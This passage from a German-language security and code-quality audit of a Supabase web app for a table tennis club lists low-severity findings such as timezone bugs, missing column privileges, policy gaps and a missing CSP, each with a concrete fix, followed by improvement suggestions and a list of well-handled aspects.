**Problem.** Jedes Ausrollen kann eine andere supabase-js- bzw. CLI-Version ziehen;
`esm.sh` ist ein zusätzlicher Dritter in der Lieferkette mit Zugriff auf den
`service_role`-Kontext. Das Verhalten ist nicht reproduzierbar, und ein kompromittiertes
Paket liefe mit vollen Datenbankrechten.

**Behebung.**

- `supabase/functions/deno.json` (oder `import_map.json`) mit exakten Versionen:
  `"@supabase/supabase-js": "npm:@supabase/supabase-js@2.112.2"` (dieselbe Version wie
  im `package-lock.json`) und
  `import { createClient } from '@supabase/supabase-js'`.
- CLI-Version fest (`version: 2.x.y`, dieselbe wie `devDependencies.supabase`).
- Actions auf Commit-SHAs pinnen (Dependabot hält sie aktuell).

---

## Niedrig

<a id="n-1"></a>

### N-1 · „Heute" wird in UTC bestimmt

**Fundstelle:** `src/features/events/schemas.ts:119`, `src/features/trainings/api.ts:156–157`,
`src/features/profile/AutoAttendanceTab.tsx:62`, `src/features/trainings/TrainingDialog.tsx:85`,
`supabase/functions/generate-training-sessions/index.ts:64`; in SQL `CURRENT_DATE`
(Datenbank läuft in UTC), z. B. `block_participants_after`, `participate_until`

**Problem.** `new Date().toISOString().slice(0, 10)` ist das UTC-Datum. Zwischen 0 und
1 Uhr (Winter) bzw. 2 Uhr (Sommer) deutscher Zeit ist das noch „gestern": Anmeldefristen
bleiben eine Stunde zu lange offen, die Terminerzeugung beginnt einen Tag zu früh.

**Behebung.** Eine Funktion `todayInBerlin()` in `src/lib/dates.ts` (es gibt dort schon
`toBerlin`) bzw. `_shared/`, z. B.
`new Intl.DateTimeFormat('en-CA', { timeZone: 'Europe/Berlin' }).format(now)` – so macht
es `enqueue-reminders` bereits. In SQL `(NOW() AT TIME ZONE 'Europe/Berlin')::date`
statt `CURRENT_DATE`.

<a id="n-2"></a>

### N-2 · Mitglied kann eigene Verwaltungsspalten ändern

**Fundstelle:** `protect_profile_columns()` in `20261002000000_absences.sql:103–136`

**Problem.** Geschützt sind `role`, `status`, `qttr`, `member_number`, `no_games`,
`deleted_at`. Frei änderbar bleiben u. a. `email` (läuft dann auseinander mit der
Anmeldeadresse in `auth.users` – Benachrichtigungen gehen an eine andere Adresse als die,
mit der man sich anmeldet), `auth_linked_at`, `last_login_at`, `created_at`.

**Behebung.** Auf eine Positivliste umstellen – am besten per Spaltenrecht
(`GRANT UPDATE (first_name, last_name, phone, mobile_phone, birthday, gender,
contact_visible, hide_birthday, emails_copies, reminder_games_hours, …)`), siehe H-1.
E-Mail-Änderung nur über `supabase.auth.updateUser({ email })` und einen Trigger auf
`auth.users`, der `profiles.email` nachzieht.

<a id="n-3"></a>

### N-3 · Mannschaftsführer darf jede Spalte eines Spiels ändern

**Fundstelle:** Policy `matches_update` (`20261004000000_teams_matches.sql`)

**Problem.** `USING/WITH CHECK (is_admin() OR leads_team(team_id))` ohne Spaltenbegrenzung:
Ein Mannschaftsführer kann `version` zurücksetzen (alte Zusagen gelten wieder),
`external_uid`/`source` ändern (der Abgleich erkennt das Spiel nicht mehr) oder das Spiel
per `team_id` in eine andere eigene Mannschaft schieben.

**Behebung.** Spaltenrechte für `authenticated` auf die fachlich gewollten Felder
(`dtstart_override`, `dtend_override`, `location_text`, `venue_id`, `required_players`,
`supervisor_id`, `comment`, `nuscore_code`, `nuscore_pin`, `cancel_reason`, `active`);
`version`, `external_uid`, `source`, `team_id` nur über RPCs bzw. den Abgleich.

Nebenbei: `nuscore_code` und `nuscore_pin` (Zugang zum Spielberichtsbogen) sind über
`matches_select` für **alle** spielenden Mitglieder lesbar. Falls das nur
Mannschaftsführer brauchen, per Spaltenrecht oder eigene View einschränken.

<a id="n-4"></a>

### N-4 · Nachrichten lassen sich an unsichtbare Objekte umhängen

**Fundstelle:** Policy `object_messages_update` (`20261025000000_object_messages.sql`)

**Problem.** `WITH CHECK (author_id = auth.uid())` prüft nicht, ob das (neue) Objekt
sichtbar ist. Per Update lassen sich `object_type`/`object_id` auf ein Objekt ändern, an
das man nicht schreiben dürfte.

**Behebung.** `WITH CHECK (author_id = auth.uid() AND public.can_see_message_object(object_type, object_id))`
oder `object_type`, `object_id`, `created_at` per Spaltenrecht unveränderlich machen.

<a id="n-5"></a>

### N-5 · Kalender-Abo mit `Cache-Control: public`

**Fundstelle:** `supabase/functions/calendar-feed/index.ts:219`

**Problem.** Die Antwort ist personenbezogen (eigene Zusagen). `public` erlaubt
Zwischenspeichern in geteilten Caches.

**Behebung.** `'Cache-Control': 'private, max-age=3600'`. Zusätzlich den Token vor der
Abfrage auf UUID-Form prüfen (spart eine Datenbankanfrage bei Müll).

<a id="n-6"></a>

### N-6 · Kalenderabgleich ohne Zeitlimit, Größenlimit und Zieladressprüfung

**Fundstelle:** `supabase/functions/sync-calendars/index.ts:199–214`

**Problem.** `fetch(url)` ohne `AbortSignal.timeout`, ohne Größenbegrenzung und an jede
hinterlegte Adresse. Ein hängender Server blockiert den Lauf bis zum Wall-Clock-Limit
der Function, eine riesige Antwort sprengt den Speicher. Die Adresse pflegt nur der
Admin – deshalb niedrig.

**Behebung.** `AbortSignal.timeout(15_000)`, `Content-Length`/gelesene Bytes begrenzen
(z. B. 2 MB), und nur `https:` auf bekannte Hosts (`*.mytischtennis.de`,
`*.click-tt.de`) zulassen.

<a id="n-7"></a>

### N-7 · Antwortseite: Auto-Speichern per `?a=` und falsche Überschrift

**Fundstelle:** `src/features/auth/ActionPage.tsx:64–68`, `:103`

**Problem.**

- Enthält die Adresse `?a=yes`, wird beim Öffnen sofort gespeichert. Link-Scanner von
  Mailprogrammen (z. B. Microsoft Safe Links), die Seiten mit JavaScript öffnen, würden so
  im Namen des Empfängers antworten und den Einmal-Token verbrauchen. Derzeit erzeugt kein
  Template solche Links – die Funktion ist aber vorbereitet.
- Die Überschrift lautet immer „Kannst du spielen?", auch bei Tokens für Vereinstermine
  und Ersatzanfragen (`info.action` wird nicht ausgewertet).

**Behebung.** `?a=` nur als Vorauswahl markieren und einen Klick verlangen; Überschrift
und Knöpfe nach `info.action` wählen.

<a id="n-8"></a>

### N-8 · Keine Content-Security-Policy

**Fundstelle:** `index.html`

**Problem.** GitHub Pages setzt keine Sicherheits-Header. Der HTML-Bereiniger
(`src/lib/richText.ts`) ist solide, eine CSP wäre die zweite Linie gegen XSS.

**Behebung.** Meta-CSP in `index.html` (das Inline-Skript für das Farbschema per Hash
erlauben oder in eine Datei verschieben):

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
               img-src 'self' data:; connect-src 'self' https://*.supabase.co wss://*.supabase.co;
               base-uri 'self'; form-action 'self'; object-src 'none'">
```

`frame-ancestors` wirkt per Meta nicht; gegen Clickjacking hilft nur ein Hoster mit
Header-Unterstützung (Cloudflare Pages, Netlify).

<a id="n-9"></a>

### N-9 · Kleinere Logikfehler

- **Umfrage** (`rpc_vote_poll`, `20261016000000_polls.sql`): Doppelte Options-IDs zählen
  bei `max_answers` doppelt; eine unbekannte ID neben einer gültigen führt zu einem
  Fremdschlüsselfehler statt `unknown_option`. Behebung:
  `v_options := ARRAY(SELECT DISTINCT o.id FROM poll_options o WHERE o.id = ANY(p_option_ids))`.
- **„Seit deinem letzten Login"** (`src/features/auth/session.tsx:74–78`):
  `touchLastLogin` läuft bei **jedem** Nachladen des Profils (Fensterfokus, Invalidierung),
  nicht einmal je Anmeldung. Behebung: nur beim Ereignis `SIGNED_IN` aus
  `onAuthStateChange` schreiben.
- **Terminerzeugung** (`generate-training-sessions/index.ts:190–205`): Ein Batch-`insert`
  scheitert komplett, wenn ein paralleler Lauf einen Tag schon angelegt hat
  (`training_sessions_unique`); der Fehler wird verschluckt. Behebung:
  `.upsert(rows, { onConflict: 'training_id,session_date', ignoreDuplicates: true })`.
- **`current_member_role()`** prüft den Status nicht (anders als `is_admin()`); in
  `trainings_insert` und `sync_runs_select` genügt so die Rolle ohne `status = 'active'`.
- **`rpc_delete_my_account`**: Die Letzter-Admin-Bremse zählt Admins ohne Blick auf
  `status = 'active'`.

---

## Verbesserungen

<a id="v-1"></a>

### V-1 · `npm run lint` läuft nicht

`package.json` definiert `eslint . --ext ts,tsx …`, aber ESLint ist weder installiert
noch konfiguriert, und die CI ruft es nicht auf. Entweder einrichten
(`eslint`, `typescript-eslint`, `eslint-plugin-react-hooks`, flache Konfiguration
`eslint.config.js`, Schritt in `ci.yml`) oder das Skript entfernen. Die
`eslint-disable`-Kommentare im Code (z. B. `ActionPage.tsx:76`) deuten darauf hin, dass
Lint einmal lief.

<a id="v-2"></a>

### V-2 · Doppelter Code in den Edge Functions

`authorize()`, `CORS`, `json()` und das Laden von `club_settings` stehen fünf- bis
siebenmal fast gleich in den Functions – die Unterschiede (welche Rollen dürfen) sind
genau die Stellen, an denen sich Fehler verstecken. Ein `_shared/http.ts` mit
`authorize(request, { roles: ['admin', 'team_leader'] })`, konstanter Zeit beim Vergleich
des Secrets und einheitlicher Fehlerantwort; `_shared/settings.ts` für die
Vereinseinstellungen.

<a id="v-3"></a>

### V-3 · Fehler der Datenbankaufrufe werden in den Functions verschluckt

Beispiele: `sync-calendars` zählt `inserted`/`rescheduled` hoch, auch wenn das `insert`
oder `update` scheitert; `enqueue-reminders` ignoriert Fehler von `rpc(...)`;
`process-notifications` prüft den Rückgabewert von `write()` nicht (eine verschickte,
aber nicht als `sent` markierte Nachricht geht beim nächsten Lauf erneut raus). Jede
`{ error }`-Rückgabe auswerten, in die Zusammenfassung schreiben (`errors: [...]`) und im
Betriebsreiter anzeigen.

<a id="v-4"></a>

### V-4 · Tests für Rechte statt nur für Verhalten

Die pgTAP-Suite testet Policies gründlich, aber keine **Rechte**: Weder K-1 noch H-1
wären aufgefallen. Ergänzen:

- Allowlist-Test für `EXECUTE` (siehe K-1).
- Spaltenrechte: als Mitglied `email`/`phone`/`comment_private` fremder Zeilen →
  `throws_ok(…, '42501')`.
- Test, dass jede Tabelle in `public` RLS aktiviert hat
  (`SELECT relname FROM pg_class … WHERE NOT relrowsecurity` → leer). Aktuell erfüllt,
  aber nicht abgesichert.

<a id="v-5"></a>

### V-5 · Betriebskonfiguration ins Repository

- `supabase/config.toml` mit `verify_jwt` je Function (H-3), Auth-Einstellungen
  (`enable_confirmations = true`, `secure_email_change_enabled = true`), `max_rows`.
- `supabase/.temp/` ist eingecheckt (`supabase/.temp/cli-latest`) – in `.gitignore`
  aufnehmen.
- Den Deploy-Workflow wieder an `push` auf `main` hängen, sobald das Projekt steht;
  vorher `supabase db push --dry-run` als Schritt in der CI.

<a id="v-6"></a>

### V-6 · Abhängigkeiten

- `npm audit`: `exceljs` → `uuid < 11.1.1` (moderat, GHSA-w5hq-g745-h8pq). Die
  betroffene Funktion (v3/v5/v6 mit `buf`) nutzt exceljs nicht; trotzdem per
  `overrides: { "uuid": "^11.1.1" }` in `package.json` auflösen, statt `audit fix --force`
  (das würde auf exceljs 3 zurückstufen).
- `vitest`/`@vitest/coverage-v8` 1.x und `vite` 5 sind zwei Hauptversionen zurück;
  `lucide-react` 0.344 sehr alt. Kein Sicherheitsproblem, aber die Updates werden mit
  jedem Monat größer. Dependabot/Renovate einrichten.
- `DesignPlayground` wird in `src/app/router.tsx:3` statisch importiert; ob Rollup ihn im
  Produktionsbuild entfernt, hängt an Seiteneffektfreiheit. `lazy(() => import(...))`
  macht das eindeutig.

<a id="v-7"></a>

### V-7 · Leistung der Hintergrundläufe

Viele Schleifen schreiben Zeile für Zeile (`for … await admin.from(...).update(...)`,
`for … await admin.rpc('enqueue_…')`). Bei Vereinsgröße unkritisch, aber jeder Lauf
wartet N Roundtrips. Wo möglich gesammelt schreiben (`upsert` mit Array, eine RPC, die
eine Liste nimmt) – das macht die Läufe außerdem atomarer (M-1).

<a id="v-8"></a>

### V-8 · Pfade bei `VITE_BASE_PATH`

`index.html` (`/icons/apple-touch-icon.png`) und `src/sw.ts` (`/icons/icon-192.png`)
verwenden absolute Pfade. Mit dem in `vite.config.ts` beschriebenen Unterpfad
(`VITE_BASE_PATH=/repo/`) fehlen dann die Symbole. `%BASE_URL%` in `index.html` bzw.
`self.registration.scope` im Service Worker verwenden.

<a id="v-9"></a>

### V-9 · Kleinigkeiten

- `invite-member` gibt Fehlermeldungen von Supabase (`detail`) an den Browser zurück –
  nur für Admins erreichbar, aber unnötig; ins Log statt in die Antwort.
- `emailHtml.ts:49` setzt `settingsUrl` ungeescaped in ein Attribut (Wert kommt aus
  `club_settings.app_url`, also vom Admin) – der Vollständigkeit halber `escapeHtml`.
- `webpush.setVapidDetails` fällt auf `mailto:admin@example.org` zurück. Push-Dienste
  (vor allem Apple) lehnen solche Kontakte zunehmend ab; ohne Absenderadresse besser
  Push überspringen und das im Betriebsreiter melden.

---

## Was gut gelöst ist

Damit das Bild vollständig ist – vieles ist ausdrücklich sorgfältig:

- Fachlogik (Ersatzkette, Erinnerungen, Kalenderabgleich, Terminplanung,
  Zustandsautomat des Postfachs) ist als reine Funktionen in `_shared/` ausgelagert und
  umfassend getestet.
- RLS ist auf **allen** Tabellen aktiv (lokal geprüft), jede Policy hat pgTAP-Tests mit
  Positiv- und Negativfall.
- Alle `SECURITY DEFINER`-Funktionen setzen `search_path`.
- Die `rpc_*`-Funktionen prüfen den Aufrufer konsequent selbst (`auth.uid()`,
  `is_active_member()`, Rollen) – das Problem in K-1 liegt ausschließlich bei den
  internen Helfern ohne `rpc_`-Präfix.
- Der HTML-Bereiniger arbeitet mit Positivliste, maskiert Attributwerte und lässt nur
  `http(s):`, `mailto:`, `tel:` als Link zu; ich habe keinen Umgehungsweg gefunden.
- Aktions- und Kalender-Tokens sind 128-Bit-Zufallswerte, nicht über die API lesbar,
  mit Ablauf.
- `service_role` kommt nie in den Browser; der einzige privilegierte Weg aus dem Browser
  (`invite-member`) prüft Rolle und Status selbst.
- Die Dokumentation von Fehlern (`docs/fehler.md`) mit Ursache und Behebung ist
  vorbildlich.
